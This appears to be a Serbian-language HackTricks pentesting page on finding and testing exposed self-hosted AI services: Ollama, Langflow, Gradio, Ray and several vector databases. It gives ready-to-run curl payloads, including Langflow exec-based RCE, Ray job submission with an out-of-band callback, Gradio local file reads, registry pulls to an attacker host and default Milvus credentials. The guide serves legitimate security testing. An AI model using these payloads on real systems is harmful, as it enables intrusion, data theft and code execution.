# Izložene samostalno hostovane AI usluge

{{#include ../banners/hacktricks-training.md}}

Timovi koji razvijaju AI funkcije često pokreću sopstvene izvršioce modela, alate za izradu agenata, demo UI-jeve, računarske klastere i vektorske baze podataka. Mnogi od ovih alata osmišljeni su za laptop ili zatvorenu laboratorijsku mrežu, pa **podrazumevano nemaju autentifikaciju** ili dolaze sa omogućenim prečicama za autentifikaciju. Kada je takva usluga dostupna napadaču, posledice obično spadaju u neku od sledećih kategorija:

- Besplatno korišćenje GPU-ova i modela, kao i krađa privatnih modela.
- Curenje promptova, dokumenata i embeddinga.
- Curenje tajni iz okruženja procesa (ključevi LLM provajdera, cloud akreditivi).
- Izvršavanje koda, jer neki od ovih API-ja izvršavaju kod **kao funkciju**.

Ova stranica opisuje kako da pronađete ove usluge i šta da testirate za svaki tip API-ja. Za ojačavanje bezbednosti samostalno hostovanog inference servera i llama.cpp `/slots` leak, pogledajte [AI Risk Frameworks](AI-Risk-Frameworks.md#self-hosted-llm-inference-hardening). Za zlonamerne fajlove modela, pogledajte [AI Models RCE](AI-Models-RCE.md).

## Otkrivanje otiska

Pošaljite ove zahteve bez akreditiva. JSON odgovor sa očekivanim poljima identifikuje proizvod, a često i verziju, što vam govori koje od provera u nastavku treba primeniti. Portovi su podrazumevani portovi navedeni u dokumentaciji ili portovi korišćeni u zvaničnim primerima za pokretanje.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

| Proizvod | Uobičajeni port | Neautentifikovani zahtev | Šta ga identifikuje |
| --- | --- | --- | --- |
| Ollama | 11434 | `GET /api/version`, `GET /api/tags` | JSON sa verzijom, lista lokalnih modela |
| Langflow | 7860 | `GET /api/v1/version` | JSON sa Langflow verzijom |
| Gradio | 7860 | `GET /config` | Konfiguracija aplikacije sa Gradio verzijom i ID-jevima komponenti |
| Ray dashboard | 8265 | `GET /api/version`, `GET /api/jobs/` | `ray_version`, lista poslatih poslova |
| Chroma | 8000 | `GET /api/v2/heartbeat`, `GET /api/v2/version` | Vrednost heartbeat-a, Chroma verzija |
| Qdrant | 6333 | `GET /`, `GET /collections` | Qdrant verzija, lista kolekcija |
| Weaviate | - | `GET /v1/meta`, `GET /v1/schema` | Weaviate verzija, klase |
| Milvus | 19530 | `POST /v2/vectordb/collections/list` | Lista kolekcija ili greška u autentifikaciji |

Ove usluge se često objavljuju i iza reverse proxy-ja pod prefiksom putanje (na primer, `/ollama/` ili `/ray/`), pa ponovite zahteve pod svim prefiksima koje pronađete u JavaScript paketima ili API dokumentaciji.

## Neautentifikovani inference i API-ji za upravljanje modelima

Izvršioci modela obično izlažu jedan REST API koji objedinjuje inference rute i administrativne rute. Ollama je dobar primer. Nema ugrađenu autentifikaciju i podrazumevano se vezuje za `127.0.0.1:11434`, dok `OLLAMA_HOST` menja adresu za vezivanje.<sup>[[1]](#references)[[15]](#references)</sup> Zvanični Docker image postavlja `OLLAMA_HOST=0.0.0.0:11434` unutar kontejnera, definiše `EXPOSE 11434` i nema instrukciju `USER`, pa server u kontejneru radi kao root.<sup>[[16]](#references)</sup> `EXPOSE` ne objavljuje port na hostu, pa dostupnost sa hosta zavisi od načina postavljanja. Dokumentovane komande `docker run` koriste `-p 11434:11434`, a Docker objavljuje takvo mapiranje na svim host interfejsima, osim ako nije navedena host IP adresa.<sup>[[17]](#references)[[18]](#references)</sup>

Šta svaka grupa ruta omogućava napadaču:<sup>[[2]](#references)</sup>

| Rute | Uticaj kada nema autentifikacije |
| --- | --- |
| `GET /api/tags`, `GET /api/ps` | Lista lokalnih i učitanih modela, uključujući privatne prilagođene modele |
| `POST /api/show` | Detalji modela, uključujući Modelfile, template i **system prompt** |
| `POST /api/generate`, `/api/chat`, `/api/embed` | Besplatan inference na hardveru žrtve |
| `POST /api/pull`, `POST /api/push` | Naterati server da preuzme model iz registry-ja koji je izabrao napadač ili da tamo otpremi model |
| `POST /api/create`, `/api/copy`, `DELETE /api/delete` | Kreiranje, prepisivanje ili brisanje modela |

```bash
curl -s http://target:11434/api/tags
curl -s http://target:11434/api/show -d '{"model":"<name from /api/tags>"}'
# Outbound fetch to a registry you control: only look for the callback
curl -s http://target:11434/api/pull -d '{"model":"<your-host>/library/test:latest","insecure":true}'
```

Lista modela vraćena bez credentials već dokazuje izloženost. Custom modeli često sadrže interni system prompt u `/api/show`. Pull ka vašem hostu dokazuje da server preuzima manifeste sa registry-ja po izboru napadača. `/api/push` ka vašem registry-ju pretvara izloženost u krađu modela. Nemojte pozivati rute za kreiranje ili brisanje na stvarnim ciljevima.

Povlačenje sa registry-ja je i površina za parser napade, jer server skladišti blobove koristeći vrednosti iz udaljenog manifesta. U slučaju Probllama (CVE-2024-37032, ispravljeno u Ollama 0.1.34), `digest` iz manifesta korišćen je kao ime fajla bez validacije. Zlonamerni registry je zato mogao da upisuje fajlove izvan direktorijuma za blobove koristeći sekvence `../`. Slanjem podmetnutog manifesta čiji je digest upućivao na lokalni fajl, taj fajl je leak-ovan na registry napadača. Wiz je postigao RCE u Docker-u, gde server radi kao root, tako što je upisao shared library i dodao je u `/etc/ld.so.preload`, a zatim pozvao `/api/chat` da bi je učitao novi proces.<sup>[[15]](#references)</sup> Kada runner može da preuzima sa proizvoljnih registry-ja, proverite kako pretvara polja manifesta u putanje.

## API-ji koji su po dizajnu namenjeni izvršavanju koda

Povezano: [Flowise per-request workflow-code overrides](../pentesting-web/server-side-javascript-injection.md#per-request-workflow-code-overrides-flowise).

### API-ji za slanje poslova

Framework-i za distribuirano računanje tretiraju izvršavanje koda kao svoju glavnu funkciju. Ray Jobs API na portu dashboard-a (8265) prihvata shell komandu `entrypoint` i izvršava je u klasteru.<sup>[[19]](#references)</sup> Istraživanje Oligo ShadowRay navodi da Jobs API nema autorizaciju i da se dashboard vezuje za `0.0.0.0`. Odgovarajući CVE-2023-48022 je sporan jer Ray očekuje da radi samo unutar kontrolisane mreže.<sup>[[20]](#references)</sup> Ray je u verziji 2.52.0 dodao opcionu autentifikaciju tokenom (`RAY_AUTH_MODE=token`). Ray 2.59 je podrazumevano uključuje za lokalne klastere pokrenute pomoću `ray.init()`; `ray start --head` i dalje može da se pokrene bez autentifikacije ako token nije dostupan. Ray dokumentuje šire uvođenje podrazumevane autentifikacije u verziji 2.61, zato proverite instaliranu verziju i način pokretanja umesto da pretpostavljate da je dashboard otvoren.<sup>[[21]](#references)</sup>

```bash
curl -s http://target:8265/api/version
curl -s http://target:8265/api/jobs/   # existing entrypoints often contain secrets
# Only if the scope allows code execution: DNS callback as proof
curl -s -X POST http://target:8265/api/jobs/ -H 'Content-Type: application/json' \
  -d '{"entrypoint":"nslookup <oast-host>","runtime_env":{}}'
```

Kontrolne table ovog tipa imaju i pomoćne rute koje vredi ispitati u starijim verzijama. Pre Ray 2.8.1, `/log_proxy?url=` preuzimao je bilo koji HTTP(S) URL (SSRF do cloud metadata), a `/api/v0/logs/file` prihvatao je proizvoljnu `filename` putanju; oba endpointa radila su bez autentifikacije.<sup>[[8]](#references)</sup>

### Endpointi za „validaciju“ koda koji izvršavaju definicije funkcija

Alati za pravljenje agenata koji prihvataju prilagođene Python komponente ponekad „validiraju“ kod tako što ga parsiraju pomoću `ast` i izvršavaju samo definicije funkcija pomoću `exec()`. Ovo nije bezbedno. Python evaluira **dekoratore i podrazumevane vrednosti argumenata prilikom definisanja funkcije**, pa se kod postavljen na ta mesta izvršava čak i ako se telo funkcije nikada ne pokrene. `POST /api/v1/validate/code` u Langflow-u radio je na ovaj način i nije zahtevao autentifikaciju pre verzije 1.3.0 (CVE-2025-3248). Podizanjem izuzetka koji sadrži izlaz komande, endpoint vraća taj izlaz u odgovoru:<sup>[[22]](#references)</sup>

```bash
# Decorator variant
curl -s -X POST -H 'Content-Type: application/json' http://target:7860/api/v1/validate/code \
  -d '{"code": "@exec(\"raise Exception(__import__(\\\"subprocess\\\").check_output(\\\"id\\\"))\")\ndef foo():\n  pass"}'
# Default-argument variant
curl -s -X POST -H 'Content-Type: application/json' http://target:7860/api/v1/validate/code \
  -d '{"code":"def foo(cmd=exec(\"raise Exception(__import__(\\\"subprocess\\\").check_output(\\\"id\\\"))\")):\n  pass"}'
```

Testirajte svaki endpoint koji kompajlira, lintuje ili „proverava“ korisnički kod u potrazi za ovim obrascem, a kao dokaz radije koristite DNS callback.

### Rute za automatsku prijavu i podrazumevani superuser token

Alati namenjeni jednom korisniku često dolaze s prečicom koja svakog posetioca prijavljuje kao administratora. U Langflow-u, kada je `AUTO_LOGIN` omogućen, `GET /api/v1/auto_login` vraća tokene podrazumevanog superuser-a svakom pozivaocu. Kada je onemogućen, ruta odgovara porukom `Auto login is disabled.`.<sup>[[23]](#references)</sup> Langflow OSS verzije od 1.0.0 do 1.10.0 podrazumevano su ga imale omogućenog (CVE-2026-9103). Kombinovanje s prethodno navedenom autentifikovanom rutom za validaciju koda ponovo omogućava neautentifikovani RCE (CVE-2026-9198, prijavio Harish Kolla).<sup>[[24]](#references)[[25]](#references)[[33]](#references)</sup> Aktuelni zvanični paketi izdanja i Docker slike onemogućavaju automatsku prijavu i zahtevaju superuser lozinku, ali razvojne grane je i dalje imaju omogućenu.<sup>[[3]](#references)</sup>

```bash
TOKEN=$(curl -s http://target:7860/api/v1/auto_login | jq -r .access_token)
curl -s -H "Authorization: Bearer $TOKEN" http://target:7860/api/v1/users/whoami
```

Čak i bez izvršavanja koda, token superuser-a omogućava pristup svim tokovima i sačuvanim akreditivima provajdera. Za povezanu proveru preduslova u automatizovanom testiranju pogledajte [Web Black-Box AI Pentester Bots](Web-Black-Box-AI-Pentester-Bots.md).

## Rute za posluživanje datoteka i RPC u ML demo korisničkim interfejsima

ML demo okviri poslužuju otpremljene i generisane datoteke putem generičke rute i omogućavaju frontend-u da poziva pomoćne funkcije komponenti na serveru. Gradio za to izlaže `/config`, `/upload` i `/file=<path>`.<sup>[[5]](#references)</sup> Na svakom sličnom okviru vredi testirati dva obrasca:

- **Traversal iz poddirektorijuma za otpremanje:** ako ruta za datoteke proverava samo da li putanja počinje unutar privremenog foldera, otpremite datoteku da biste napravili poddirektorijum, a zatim izađite iz njega pomoću `../` ili `%2e%2e%2f`. Gradio 4.0–4.10 (CVE-2023-51449) bio je ranjiv na ovaj način.<sup>[[26]](#references)[[27]](#references)</sup> Pošaljite zahtev pomoću `curl --path-as-is` kako klijent ne bi normalizovao putanju.
- **Arbitrary method dispatch:** krajnja tačka koja poziva `getattr(component, fn_name)` sa korisničkim unosom omogućava napadaču da poziva interne pomoćne funkcije. Pre verzije 4.13.0, Gradio-ov `/component_server` radio je to. U verzijama 4.3–4.12, `move_resource_to_block_cache` je kopirao bilo koju lokalnu datoteku u keš, odakle se mogla preuzeti pomoću `/file=`. U verzijama 3.47–3.50.2, druge pomoćne funkcije omogućavale su čitanje datoteka i SSRF sa čitanjem celog sadržaja.<sup>[[26]](#references)[[28]](#references)</sup> Ispravljeni server odgovara sa `Function not found.` za pomoćne funkcije koje nisu označene kao serverske funkcije.<sup>[[28]](#references)</sup>

```bash
curl -s http://target:7860/config | jq '.components[].id'
curl -s http://target:7860/component_server -H 'Content-Type: application/json' \
  -d '{"component_id":"1","data":"/etc/hostname","fn_name":"move_resource_to_block_cache","session_hash":"aaa"}'
curl -s 'http://target:7860/file=<returned_path>'
```

Na Hugging Face Spaces, tajne prostora (Space secrets) su promenljive okruženja, pa je `/proc/self/environ` najvrednija datoteka. Horizon3 ju je pročitao pomoću HTTP zaglavlja `Range`.<sup>[[26]](#references)</sup>

## Vektorske baze podataka koje koristi RAG

RAG čuva delove izvornih dokumenata, njihova embeddinge i metapodatke u vektorskoj bazi podataka, a asistent u svoj prompt smešta najbolje rezultate. Zato pristup za čitanje otkriva **običan tekst privatnih dokumenata**. Pristup za pisanje omogućava napadaču da ubaci delove koji će kasnije biti preuzeti u promptove drugih korisnika, što predstavlja persistent indirect prompt injection (pogledajte [AI Prompts](AI-Prompts.md#third-party-or-indirect-prompt-injection)).

Za vektorske baze podataka koje sami hostujete proverite da li je podešena autentifikacija ili omogućen anonimni pristup:

- **Qdrant**: samostalno postavljene instance osluškuju na svim interfejsima bez autentifikacije. Kada je podešen, ključ se prosleđuje u zaglavlju `api-key` ili kao `Authorization: Bearer`. Mogu postojati ključevi samo za čitanje i ključevi za pojedinačne kolekcije.<sup>[[11]](#references)</sup>
- **Chroma**: autentifikacija je podrazumevano onemogućena. Za autentifikaciju tokenom koriste se `Authorization` ili `X-Chroma-Token`.<sup>[[29]](#references)</sup>
- **Weaviate**: zahtevi bez akreditiva se autentifikuju kao `user: anonymous` kada je omogućen anonimni pristup i dobijaju sve dozvole koje taj korisnik ima.<sup>[[30]](#references)</sup>
- **Milvus**: autentifikacija je isključena osim ako je `common.security.authorizationEnabled` postavljeno na `true`. Kada je uključena, podrazumevani korisnik `root` ima lozinku `Milvus`, a format tokena je `username:password`.<sup>[[31]](#references)[[14]](#references)</sup>

Odgovor koji sadrži privatne podatke bez akreditiva ukazuje na izloženost. Ako je autentifikacija omogućena, zasebno proverite da li je neki podrazumevani nalog ostao nepromenjen:<sup>[[12]](#references)[[10]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
curl -s http://target:6333/collections
curl -s -X POST http://target:6333/collections/<name>/points/scroll -H 'Content-Type: application/json' -d '{"limit":3,"with_payload":true}'
curl -s http://target:8000/api/v2/tenants/default_tenant/databases/default_database/collections
curl -s 'http://target:<weaviate-port>/v1/objects?limit=3'
curl -s -X POST http://target:19530/v2/vectordb/collections/list -H 'Authorization: Bearer root:Milvus' -H 'Content-Type: application/json' -d '{}'
```

Proverite da li payload-i sadrže tekst dokumenata, identifikatore korisnika ili nazive tenant-a. Da biste pokazali mogućnost upisa bez zagađivanja produkcionih podataka, kreirajte i odmah obrišite praznu kolekciju s jasno prepoznatljivim nazivom, i to samo ako je to dozvoljeno u okviru opsega.

Autentifikacija na ovim serverima može da se izvrši i prekasno. Na Chroma Python FastAPI serveru (od verzije 1.0.0 do najmanje 1.5.8, CVE-2026-45829), ruta za kreiranje kolekcije napravila je embedding funkciju koju je dostavio klijent pre provere autentifikacije. Konfiguracija koja je upućivala na Hugging Face model pod kontrolom napadača, uz `trust_remote_code: true`, pokrenula je kod napadača čak i kada je zahtev odbijen. Rust frontend nije bio pogođen.<sup>[[32]](#references)</sup> Kada zahtev sadrži konfiguraciju modela ili dodatka, testirajte ga bez akreditiva i pratite da li dolazi do odlaznog zahteva ka vašem repozitorijumu modela.

## References

- [1] [Ollama FAQ](https://github.com/ollama/ollama/blob/main/docs/faq.mdx)
- [2] [Ollama API dokumentacija](https://github.com/ollama/ollama/blob/main/docs/api.md)
- [3] [Langflow README](https://github.com/langflow-ai/langflow/blob/main/README.md)
- [4] [Langflow izvorni kod - API v1 krajnje tačke](https://github.com/langflow-ai/langflow/blob/main/src/backend/base/langflow/api/v1/endpoints.py)
- [5] [Gradio izvorni kod - routes.py](https://github.com/gradio-app/gradio/blob/main/gradio/routes.py)
- [6] [Gradio izvorni kod - http_server.py](https://github.com/gradio-app/gradio/blob/main/gradio/http_server.py)
- [7] [Ray izvorni kod - job_head.py](https://github.com/ray-project/ray/blob/master/python/ray/dashboard/modules/job/job_head.py)
- [8] [Bishop Fox - Ray, verzije 2.6.3, 2.8.0](https://bishopfox.com/blog/ray-versions-2-6-3-2-8-0)
- [9] [Chroma izvorni kod - podrazumevane vrednosti Python klijenta](https://github.com/chroma-core/chroma/blob/main/chromadb/__init__.py)
- [10] [Chroma izvorni kod - FastAPI serverske rute](https://github.com/chroma-core/chroma/blob/main/chromadb/server/fastapi/__init__.py)
- [11] [Qdrant - Bezbednost](https://qdrant.tech/documentation/security/)
- [12] [Qdrant OpenAPI specifikacija](https://github.com/qdrant/qdrant/blob/master/docs/redoc/master/openapi.json)
- [13] [Weaviate OpenAPI specifikacija](https://github.com/weaviate/weaviate/blob/main/openapi-specs/schema.json)
- [14] [Milvus - Povezivanje sa Milvus serverom](https://milvus.io/docs/connect-to-milvus-server.md)
- [15] [Wiz - Probllama: ranjivost Ollama za udaljeno izvršavanje koda (CVE-2024-37032)](https://www.wiz.io/blog/probllama-ollama-vulnerability-cve-2024-37032)
- [16] [Ollama Dockerfile](https://github.com/ollama/ollama/blob/main/Dockerfile)
- [17] [Ollama Docker dokumentacija](https://github.com/ollama/ollama/blob/main/docs/docker.mdx)
- [18] [Docker - Objavljivanje i izlaganje portova](https://docs.docker.com/get-started/docker-concepts/running-containers/publishing-ports/)
- [19] [Ray Jobs REST API](https://docs.ray.io/en/latest/cluster/running-applications/job-submission/rest.html)
- [20] [Oligo - ShadowRay: Prva poznata kampanja napada usmerena na AI radna opterećenja, iskorišćena u divljini](https://www.oligo.security/blog/shadowray-attack-ai-workloads-actively-exploited-in-the-wild)
- [21] [Ray autentifikacija tokenom](https://docs.ray.io/en/latest/ray-security/token-auth.html)
- [22] [Horizon3.ai - Nije bezbedno ni pri bilo kojoj brzini: zloupotreba Python Exec za neautentifikovani RCE u Langflow AI](https://horizon3.ai/attack-research/disclosures/unsafe-at-any-speed-abusing-python-exec-for-unauth-rce-in-langflow-ai/)
- [23] [Langflow izvorni kod - login ruter](https://github.com/langflow-ai/langflow/blob/main/src/backend/base/langflow/api/v1/login.py)
- [24] [NVD - CVE-2026-9103](https://nvd.nist.gov/vuln/detail/CVE-2026-9103)
- [25] [NVD - CVE-2026-9198](https://nvd.nist.gov/vuln/detail/CVE-2026-9198)
- [26] [Horizon3.ai - Iskorišćavanje ranjivosti čitanja datoteka u Gradio-u radi krađe tajni iz Hugging Face Spaces](https://horizon3.ai/attack-research/disclosures/exploiting-file-read-vulnerabilities-in-gradio-to-steal-secrets-from-hugging-face-spaces/)
- [27] [Gradio bezbednosno obaveštenje GHSA-6qm2-wpxq-7qh2](https://github.com/gradio-app/gradio/security/advisories/GHSA-6qm2-wpxq-7qh2)
- [28] [Gradio commit ispravke za `/component_server`](https://github.com/gradio-app/gradio/commit/24a583688046867ca8b8b02959c441818bdb34a2)
- [29] [Chroma Cookbook - Chroma-native autentifikacija](https://cookbook.chromadb.dev/security/legacy-auth/)
- [30] [Weaviate - Autentifikacija](https://docs.weaviate.io/weaviate/configuration/authentication)
- [31] [Milvus - Autentifikacija korisničkog pristupa](https://milvus.io/docs/authenticate.md)
- [32] [HiddenLayer - ChromaToast poslužen pre autentifikacije](https://www.hiddenlayer.com/research/chromatoast-served-pre-auth)
- [33] [IBM bezbednosno obaveštenje - Neautentifikovano udaljeno izvršavanje koda putem zaobilaženja automatske prijave i validacije koda (CVE-2026-9198)](https://www.ibm.com/support/pages/node/7278927)
